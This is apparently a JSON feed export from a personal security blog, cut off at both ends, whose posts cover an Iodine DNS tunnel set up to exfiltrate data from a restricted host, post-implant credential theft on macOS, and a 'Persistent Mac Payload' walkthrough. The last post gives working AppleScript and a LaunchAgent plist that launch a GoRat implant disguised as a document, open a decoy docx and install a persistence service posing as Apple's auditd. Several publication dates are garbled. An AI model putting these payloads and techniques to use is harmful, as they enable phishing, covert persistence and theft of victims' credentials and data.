style=\"color:#75715e\"\u003e#define NOTE_FS7 2960\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_G7  3136\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_GS7 3322\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_A7  3520\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_AS7 3729\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_B7  3951\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_C8  4186\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_CS8 4435\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_D8  4699\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_DS8 4978\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e",
      "url": "https://potat0ast.com/2021/05/24/t-beam-alarm-clock/",
      "image": "https://potat0ast.com/photos/<no value>",
      "banner_image": "https://potat0ast.com/photos/<no value>",
      "date_published": "24056-24-09T533:2424:00-08:00",
      "date_modified": "24056-24-09T533:2424:00-08:00",
      "author": {
        "name": "Ronalds Vilcins",
        "url": "https://ronaldsvilcins.com/"
      }
    },
    
    {
      "id": "466ae068d09c77ca82365935d1f7620aab13cf0f",
      "title": "Configuring Iodine",
      "summary": "",
      "content_text": "Introduction # What is Iodine? Rather than defining it, let\u0026rsquo;s start with an example. Let\u0026rsquo;s say you have physical access to a box and you desperately need to exfiltrate some data. However, you quickly discover that you cannot connect outbound on any port except 53. Basic protocol checks prevent you from simply configuring an FTP server on port 53 of your cloud server. And to throw another wrench into the gears, it seems like they have locked you into a set of standard public DNS servers anyway. How will you get any data out through just DNS destined for Google or Cloudflare servers? This is where Iodine comes in. (Some have also noted Iodine\u0026rsquo;s usefulness in getting free wifi on planes and in hotels but we are not doing this)\nIodine provides a DNS tunnel on which other protocols such as HTTP or FTP can piggy back, allowing us to upload files with just access to public DNS servers. For more information on how non-DNS data may be carried over DNS, see our previous blog on out-of-band DNS.\nWhat you need # A domain. Grab one off Namecheap or Godaddy, to name a couple domain name registrars. A server to receive the DNS requests. A cloud server or virtual private server (\u0026ldquo;VPS\u0026rdquo;) will be easiest, since it already has a public address and we won\u0026rsquo;t need to port forward anything. A target. Probably one that has some painful networking restrictions. Step 1: Set up your server # First, create an Ubuntu server on your VPS provider of choice. On that server:\nMake sure you disable any conflicting DNS services on port 53. See other blogs on Linux sysadmin basics for more information on the command to use. Most likely, the following command will work: systemctl stop systemd-resolved You can also run apt update and apt upgrade as needed. This should not be an issue because you just made the VPS, and it should be a relatively new image. But it is good practice and may fix problems with outdated packages.\nLet\u0026rsquo;s compile and install the server binary (both the client and server binary are the same, just run with different arguments and flags). First, clone the repository to your system.\ngit clone https://github.com/yarrick/iodine.git Once the iodine repo is in your current directory, enter the directory with:\ncd iodine Ensure that you have the libz-dev installed. This library, used for data compression, is necessary for the compilation process (transporting data over DNS means that data compression is going to play a big role in maximizing throughput). Install the package using:\napt install libz-dev Now we compile the app using:\nmake And now install it (installing in general is moving files to the right locations for execution; here, we just move the compiled binary to a directory in the path). Use the command:\nmake install Step 2: Configure your DNS entries # Next we need to ensure that DNS requests can reach our server. Our first entry will be to give our \u0026ldquo;DNS\u0026rdquo; server an FQDN. Go to your domain registrar\u0026rsquo;s website and open the DNS settings for the domain you want to use.\nWe will start by adding an A record that will point to the IP of your hosted server. The entry should look something like the following, depending on your registrar\u0026rsquo;s web site: |Type |Host |Value | TTL | |A Record | ns | IP Address | Auto | An A record is one of the simplest types of records, and it determines what IP to direct traffic to when a certain hostname is requested. In this example, let\u0026rsquo;s say you bought testeroni.com. The above record will direct any traffic destined for ns.testeroni.com to the IP address you specify. If you wanted another host on this domain, you can give it another name like computer1 and it would be reachable on computer1.testeroni.com.\nNow to get DNS traffic to our ns.testeroni.com host, we need to configure it to be the resolver for a subdomain we setup. For example, our subdomain can be called s.testeroni.com, any requests to resolve [somehost].s.testeroni.com will go to a specified name server. In this case, we will sit it to ns.testeroni.com. |Type |Host |Value | TTL | |NS Record | s | ns.potato.monster. | Auto |\nJust as a recap, we have a subdomain called s of our domain testeroni.com. Any host information is specified before s.testeroni.com.\nStart up the server # iodined -f -c -P [password] 192.168.77.1 s.testeroni.com We will start with the -f option to start iodined in the foreground; this is going to help with troubleshooting. -c is used for compression, -P is to specify the password. The IP address is the address you want for the tunnel. This should be a different subnet than your local network. You use these IPs to communicate between the two hosts through the tunnel.\nStart the client program # iodine -f -P [password] s.testeroni.com Here, we start the client program with a similar command, but note the lack of the d for daemon at the end. The client program will attempt to connect to the server using just DNS. Data will be encoded in the host section of the subdomain like so [data].s.testeroni.com.\nTest the connection # To test if the tunnel is configured properly, try using the following command from your client (and vice versa):\nping \u0026lt;tunnel-IP-of-server\u0026gt; Any traffic that you need tunneled through DNS can simply be directed towards the server\u0026rsquo;s tunnel IP. For specific application traffic to be forwarded, configure proxies (see http or SOCKS proxies) that will handle requests using the less restricted server side.\n",
      "content_html": "\u003ch2 id=\"introduction\"\u003eIntroduction \u003ca href=\"#introduction\" class=\"hash\"\u003e#\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003eWhat is Iodine? Rather than defining it, let\u0026rsquo;s start with an example. Let\u0026rsquo;s say you have physical access to a box and you desperately need to exfiltrate some data. However, you quickly discover that you cannot connect outbound on any port except 53. Basic protocol checks prevent you from simply configuring an FTP server on port 53 of your cloud server. And to throw another wrench into the gears, it seems like they have locked you into a set of standard public DNS servers anyway. How will you get any data out through just DNS destined for Google or Cloudflare servers? This is where Iodine comes in. (Some have also noted Iodine\u0026rsquo;s usefulness in getting free wifi on planes and in hotels but we are not doing this)\u003c/p\u003e\n\u003cp\u003eIodine provides a DNS tunnel on which other protocols such as HTTP or FTP can piggy back, allowing us to upload files with just access to public DNS servers. For more information on how non-DNS data may be carried over DNS, see our previous \u003ca href=\"https://svl.sh/oob-dns/\"\u003eblog\u003c/a\u003e\n\u003cdiv class=\"box\"\u003e\n  \u003ciframe src=\"https://svl.sh/oob-dns/\"\u003e\n  \u003c/iframe\u003e\n\u003c/div\u003e\n on out-of-band DNS.\u003c/p\u003e\n\u003ch2 id=\"what-you-need\"\u003eWhat you need \u003ca href=\"#what-you-need\" class=\"hash\"\u003e#\u003c/a\u003e\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eA domain. Grab one off Namecheap or Godaddy, to name a couple domain name registrars.\u003c/li\u003e\n\u003cli\u003eA server to receive the DNS requests. A cloud server or virtual private server (\u0026ldquo;VPS\u0026rdquo;) will be easiest, since it already has a public address and we won\u0026rsquo;t need to port forward anything.\u003c/li\u003e\n\u003cli\u003eA target. Probably one that has some painful networking restrictions.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"step-1-set-up-your-server\"\u003eStep 1: Set up your server \u003ca href=\"#step-1-set-up-your-server\" class=\"hash\"\u003e#\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003eFirst, create an Ubuntu server on your VPS provider of choice. On that server:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMake sure you disable any conflicting DNS services on port 53. See other blogs on Linux sysadmin basics for more information on the command to use. Most likely, the following command will work:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esystemctl stop systemd-resolved\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eYou can also run \u003ccode\u003eapt update\u003c/code\u003e and \u003ccode\u003eapt upgrade\u003c/code\u003e as needed. This should not be an issue because you just made the VPS, and it should be a relatively new image. But it is good practice and may fix problems with outdated packages.\u003c/p\u003e\n\u003cp\u003eLet\u0026rsquo;s compile and install the server binary (both the client and server binary are the same, just run with different arguments and flags).\nFirst, clone the repository to your system.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit clone https://github.com/yarrick/iodine.git\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eOnce the iodine repo is in your current directory, enter the directory with:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecd iodine\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eEnsure that you have the libz-dev installed. This library, used for data compression, is necessary for the compilation process (transporting data over DNS means that data compression is going to play a big role in maximizing throughput). Install the package using:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eapt install libz-dev\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eNow we compile the app using:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emake\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eAnd now install it (installing in general is moving files to the right locations for execution; here, we just move the compiled binary to a directory in the path). Use the command:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emake install\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"step-2-configure-your-dns-entries\"\u003eStep 2: Configure your DNS entries \u003ca href=\"#step-2-configure-your-dns-entries\" class=\"hash\"\u003e#\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003eNext we need to ensure that DNS requests can reach our server.\nOur first entry will be to give our \u0026ldquo;DNS\u0026rdquo; server an FQDN. Go to your domain registrar\u0026rsquo;s website and open the DNS settings for the domain you want to use.\u003c/p\u003e\n\u003cp\u003eWe will start by adding an A record that will point to the IP of your hosted server. The entry should look something like the following, depending on your registrar\u0026rsquo;s web site:\n|Type |Host |Value | TTL |\n|A Record | ns | IP Address | Auto |\nAn A record is one of the simplest types of records, and it determines what IP to direct traffic to when a certain hostname is requested. In this example, let\u0026rsquo;s say you bought \u003ccode\u003etesteroni.com\u003c/code\u003e. The above record will direct any traffic destined for \u003ccode\u003ens.testeroni.com\u003c/code\u003e to the IP address you specify. If you wanted another host on this domain, you can give it another name like \u003ccode\u003ecomputer1\u003c/code\u003e and it would be reachable on \u003ccode\u003ecomputer1.testeroni.com\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eNow to get DNS traffic to our \u003ccode\u003ens.testeroni.com\u003c/code\u003e host, we need to configure it to be the resolver for a subdomain we setup. For example, our subdomain can be called \u003ccode\u003es.testeroni.com\u003c/code\u003e, any requests to resolve \u003ccode\u003e[somehost].s.testeroni.com\u003c/code\u003e will go to a specified name server. In this case, we will sit it to \u003ccode\u003ens.testeroni.com\u003c/code\u003e.\n|Type |Host |Value | TTL |\n|NS Record | s | ns.potato.monster. | Auto |\u003c/p\u003e\n\u003cp\u003eJust as a recap, we have a subdomain called \u003ccode\u003es\u003c/code\u003e of our domain \u003ccode\u003etesteroni.com\u003c/code\u003e. Any host information is specified before \u003ccode\u003es.testeroni.com\u003c/code\u003e.\u003c/p\u003e\n\u003ch2 id=\"start-up-the-server\"\u003eStart up the server \u003ca href=\"#start-up-the-server\" class=\"hash\"\u003e#\u003c/a\u003e\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eiodined  -f -c -P \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003epassword\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e 192.168.77.1 s.testeroni.com\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eWe will start with the \u003ccode\u003e-f\u003c/code\u003e option to start iodined in the foreground; this is going to help with troubleshooting. \u003ccode\u003e-c\u003c/code\u003e is used for compression, \u003ccode\u003e-P\u003c/code\u003e is to specify the password.\nThe IP address is the address you want for the \u003cem\u003etunnel\u003c/em\u003e. This should be a different subnet than your local network. You use these IPs to communicate between the two hosts through the tunnel.\u003c/p\u003e\n\u003ch2 id=\"start-the-client-program\"\u003eStart the client program \u003ca href=\"#start-the-client-program\" class=\"hash\"\u003e#\u003c/a\u003e\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eiodine -f -P \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003epassword\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e s.testeroni.com\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eHere, we start the client program with a similar command, but note the lack of the d for daemon at the end. The client program will attempt to connect to the server using just DNS. Data will be encoded in the host section of the subdomain like so \u003ccode\u003e[data].s.testeroni.com\u003c/code\u003e.\u003c/p\u003e\n\u003ch2 id=\"test-the-connection\"\u003eTest the connection \u003ca href=\"#test-the-connection\" class=\"hash\"\u003e#\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003eTo test if the tunnel is configured properly, try using the following command from your client (and vice versa):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eping \u0026lt;tunnel-IP-of-server\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eAny traffic that you need tunneled through DNS can simply be directed towards the server\u0026rsquo;s tunnel IP. For specific application traffic to be forwarded, configure proxies (see http or SOCKS proxies) that will handle requests using the less restricted server side.\u003c/p\u003e\n",
      "url": "https://potat0ast.com/2021/05/19/iodine/",
      "image": "https://potat0ast.com/photos/<no value>",
      "banner_image": "https://potat0ast.com/photos/<no value>",
      "date_published": "19056-19-09T58:1919:00-08:00",
      "date_modified": "19056-19-09T58:1919:00-08:00",
      "author": {
        "name": "Ronalds Vilcins",
        "url": "https://ronaldsvilcins.com/"
      }
    },
    
    {
      "id": "f2918f59d2d9675ad0153a106265d9b318dee58f",
      "title": "My First Post",
      "summary": "",
      "content_text": "Hello and welcome to la blog\nimport sys for x in sys.argv: print(x) Figure 1: Sandwich\nColorful text!\nThis is shortcode text emoji_page hello test ",
      "content_html": "\u003cp\u003eHello and welcome to la blog\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e sys\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e x \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e sys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eargv:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  print(x)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"/posts/my-first-post/picture1.png\" alt=\"pic caption=hello\" loading=\"lazy\" /\u003e\n\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eFigure 1: Sandwich\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003cp style=\"color:yellow\"\u003eColorful text!\u003c/p\u003e\nThis is shortcode text\n\n\u003ca href=\"/2019/03/05/emoji-support/\"\u003eemoji_page\u003c/a\u003e\n\u003cdiv class=\"box\"\u003e\n  \u003ciframe src=\"/2019/03/05/emoji-support/\"\u003e\n  \u003c/iframe\u003e\n\u003c/div\u003e\n\nhello \u003ca href=\"https://svl.sh/oob-dns/\"\u003etest\u003c/a\u003e\n\u003cdiv class=\"box\"\u003e\n  \u003ciframe src=\"https://svl.sh/oob-dns/\"\u003e\n  \u003c/iframe\u003e\n\u003c/div\u003e\n\u003c/p\u003e\n",
      "url": "https://potat0ast.com/2021/01/05/my-first-post/",
      "image": "https://potat0ast.com/photos/<no value>",
      "banner_image": "https://potat0ast.com/photos/<no value>",
      "date_published": "5016-05-09T155:55:00-08:00",
      "date_modified": "5016-05-09T155:55:00-08:00",
      "author": {
        "name": "Ronalds Vilcins",
        "url": "https://ronaldsvilcins.com/"
      }
    },
    
    {
      "id": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
      "title": "",
      "summary": "",
      "content_text": "Pasteboard Monitor # With an OS X implant up and running, my team and I were looking for ways to gain additional access. The primary things we had to look at once on the system were:\nsystem keychain (but would need the password to decrypt) Web browser cookies shell history .aws directory and other similar config files ssh keys Note: ChromeCookieDecryptor rewrite to loop through items lol.\nGoing through the list, it is actually fairly easy to simply pull most of these items off of the computer. The chrome cookies, however, are protected by a master key which is likely stored in the system keychain. And the system keychain, will need a user password to decrypt. At the end of the day, we are probably going to want the user\u0026rsquo;s password. The first option we have is a fairly standard methodology. Create a prompt with JXA or Applescript that prompts the user for their password. Either the password is returned to the console that the attacker controls, or it is written to a file that the attacker can read later. This is a pretty elegant solution; just use the weak squishy human brain to get to the credentials. INSERT IMAGE of the popup However, there are serious shortcumings to this solution. The function that produces the popup is abstracted and easy to use for us, the person writing the code. However, our options to make it look legitimate are heavily limited. There is a reason why the popup looks the way it does (and no, generally hackers don\u0026rsquo;t get lazy about their TTPs). We are limited to just one text box, rather than perhaps having one with a username and password (like an actual sudo prompt) and we can only have a limited set of buttons. Additionally, we can\u0026rsquo;t label the text boxes with something like \u0026ldquo;username\u0026rdquo; or \u0026ldquo;password\u0026rdquo;.\nHow else can we get the password? Well there is grabbing the hash and attempting to crack it. A very legitimate solution but it will require root (maybe obtain it by getting the user to run a process as root, then use this to grab the hash).\nFinally, there is the pasteboard. Maybe this individual uses a password manager or simply keeps their password in a note on the system (okay maybe just find this note if this was the case). The pasteboard is a very intersting approach because we don\u0026rsquo;t need special permissions, it won\u0026rsquo;t cause any TCC pop-up, and the information you can glean won\u0026rsquo;t be limited to the system credentials.\n",
      "content_html": "\u003ch2 id=\"pasteboard-monitor\"\u003ePasteboard Monitor \u003ca href=\"#pasteboard-monitor\" class=\"hash\"\u003e#\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003eWith an OS X implant up and running, my team and I were looking for ways to gain additional access. The primary things we had to look at once on the system were:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003esystem keychain (but would need the password to decrypt)\u003c/li\u003e\n\u003cli\u003eWeb browser cookies\u003c/li\u003e\n\u003cli\u003eshell history\u003c/li\u003e\n\u003cli\u003e.aws directory and other similar config files\u003c/li\u003e\n\u003cli\u003essh keys\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eNote: ChromeCookieDecryptor rewrite to loop through items lol.\u003c/p\u003e\n\u003cp\u003eGoing through the list, it is actually fairly easy to simply pull most of these items off of the computer. The chrome cookies, however, are protected by a master key which is likely stored in the system keychain. And the system keychain, will need a user password to decrypt.\nAt the end of the day, we are probably going to want the user\u0026rsquo;s password. The first option we have is a fairly standard methodology. Create a prompt with JXA or Applescript that prompts the user for their password. Either the password is returned to the console that the attacker controls, or it is written to a file that the attacker can read later. This is a pretty elegant solution; just use the weak squishy human brain to get to the credentials.\n\u003cstrong\u003eINSERT IMAGE of the popup\u003c/strong\u003e\nHowever, there are serious shortcumings to this solution. The function that produces the popup is abstracted and easy to use for us, the person writing the code. However, our options to make it look legitimate are heavily limited. There is a reason why the popup looks the way it does (and no, generally hackers don\u0026rsquo;t get lazy about their TTPs). We are limited to just one text box, rather than perhaps having one with a username and password (like an actual sudo prompt) and we can only have a limited set of buttons. Additionally, we can\u0026rsquo;t label the text boxes with something like \u0026ldquo;username\u0026rdquo; or \u0026ldquo;password\u0026rdquo;.\u003c/p\u003e\n\u003cp\u003eHow else can we get the password? Well there is grabbing the hash and attempting to crack it. A very legitimate solution but it will require root (maybe obtain it by getting the user to run a process as root, then use this to grab the hash).\u003c/p\u003e\n\u003cp\u003eFinally, there is the pasteboard. Maybe this individual uses a password manager or simply keeps their password in a note on the system (okay maybe just find this note if this was the case). The pasteboard is a very intersting approach because we don\u0026rsquo;t need special permissions, it won\u0026rsquo;t cause any TCC pop-up, and the information you can glean won\u0026rsquo;t be limited to the system credentials.\u003c/p\u003e\n",
      "url": "https://potat0ast.com/1/01/01/pasteboard_monitor/",
      "image": "https://potat0ast.com/photos/<no value>",
      "banner_image": "https://potat0ast.com/photos/<no value>",
      "date_published": "1016-01-09T10:11:00+00:00",
      "date_modified": "1016-01-09T10:11:00+00:00",
      "author": {
        "name": "Ronalds Vilcins",
        "url": "https://ronaldsvilcins.com/"
      }
    },
    
    {
      "id": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
      "title": "",
      "summary": "",
      "content_text": "Persistent Mac Payload # App Bundle Disguised # This is most easily performed if you have a Mac to create the payload on. We will be disguising the app as a document file, but you can do anything as long as you have the appropriate icon. The application structure will look something like this (only the components we are worried about will be indicated. A lot of the other files and directories come standard with the app bundle:\n(D) phishLoad.app (D) Contents GoRat Binary launchAgent.plist dummy.docx (D) Resources applet.icns (D) Scripts main.scpt To begin, open \u0026ldquo;Script Editor\u0026rdquo; and copy and paste the script included below. See the comments to understand the different statements used in the script. When saving the script, make sure to save it as an \u0026ldquo;Application\u0026rdquo; under File Format.\n#set myPath to path to me as text # creates and sets the myPath variable to be the path to the app #if myPath ends with \u0026#34;:\u0026#34; then # depending on whether or not the path ends with a colon, set the offset to get the current app\u0026#39;s name #\tset n to -2 #else #\tset n to -1 #end if #set AppleScript\u0026#39;s text item delimiters to \u0026#34;:\u0026#34; # set the delimiters to be colons as used in the myPath variable #set myName to text item n of myPath # set myName variable to the nth item, which should be the [appName].app #if (myName contains \u0026#34;.\u0026#34;) then #\tset AppleScript\u0026#39;s text item delimiters to \u0026#34;.\u0026#34; #\tset myName to text item -2 of myName #end if # get just the name before the .app # the section above is useful to create a variable with the app\u0026#39;s name do shell script \u0026#34;FILE=\u0026#34; \u0026amp; (path to me)\u0026#39;s POSIX path\u0026#39;s quoted form \u0026amp; \u0026#34; # get the path to current directory cd $FILE || exit; chmod +x ./Contents/auditd; ./Contents/auditd \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026#34; # cd to directory and execute implant do shell script \u0026#34;FILE=\u0026#34; \u0026amp; (path to me)\u0026#39;s POSIX path\u0026#39;s quoted form \u0026amp; \u0026#34; cd $FILE || exit; open ./Contents/Independence-Day-Swag-Giveaway-Form2021.docx \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026#34; # open decoy docx do shell script \u0026#34;FILE=\u0026#34; \u0026amp; (path to me)\u0026#39;s POSIX path\u0026#39;s quoted form \u0026amp; \u0026#34; cd $FILE || exit; mkdir -p ~/Library/StartupItems/; mkdir -p ~/Library/LaunchAgents/\u0026#34; # create payload directories in case they don\u0026#39;t exist do shell script \u0026#34;FILE=\u0026#34; \u0026amp; (path to me)\u0026#39;s POSIX path\u0026#39;s quoted form \u0026amp; \u0026#34; cd $FILE || exit; cp -r ./Contents/auditd ~/Library/StartupItems/\u0026#34; # copy payload to persistence destination do shell script \u0026#34;FILE=\u0026#34; \u0026amp; (path to me)\u0026#39;s POSIX path\u0026#39;s quoted form \u0026amp; \u0026#34; cd $FILE || exit; cp -r ./Contents/com.apple.auditd.plist ~/Library/LaunchAgents/; launchctl load ~/Library/LaunchAgents/com.apple.auditd.plist \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026#34; # copy plist to destination and create persistent service The following plust defines the service that will start the GoRat payload on boot. Use launchctl load [path to plist] to have the service start automatically on each boot (and the first time without reboot since RunAtLoad is set).\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;Label\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;auditd\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;ProgramArguments\u0026lt;/key\u0026gt; \u0026lt;array\u0026gt; \u0026lt;string\u0026gt;zsh\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;-c\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;~/Library/StartupItems/auditd\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;--no-window\u0026lt;/string\u0026gt; \u0026lt;/array\u0026gt; \u0026lt;key\u0026gt;RunAtLoad\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/plist\u0026gt; ",
      "content_html": "\u003ch1 id=\"persistent-mac-payload\"\u003ePersistent Mac Payload \u003ca href=\"#persistent-mac-payload\" class=\"hash\"\u003e#\u003c/a\u003e\u003c/h1\u003e\n\u003ch3 id=\"app-bundle-disguised\"\u003eApp Bundle Disguised \u003ca href=\"#app-bundle-disguised\" class=\"hash\"\u003e#\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003eThis is most easily performed if you have a Mac to create the payload on. We will be disguising the app as a document file, but you can do anything as long as you have the appropriate icon.\nThe application structure will look something like this (only the components we are worried about will be indicated. A lot of the other files and directories come standard with the app bundle:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e(D) phishLoad.app\n\u003cul\u003e\n\u003cli\u003e(D) Contents\n\u003cul\u003e\n\u003cli\u003eGoRat Binary\u003c/li\u003e\n\u003cli\u003elaunchAgent.plist\u003c/li\u003e\n\u003cli\u003edummy.docx\u003c/li\u003e\n\u003cli\u003e(D) Resources\n\u003cul\u003e\n\u003cli\u003eapplet.icns\u003c/li\u003e\n\u003cli\u003e(D) Scripts\n\u003cul\u003e\n\u003cli\u003emain.scpt\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eTo begin, open \u0026ldquo;Script Editor\u0026rdquo; and copy and paste the script included 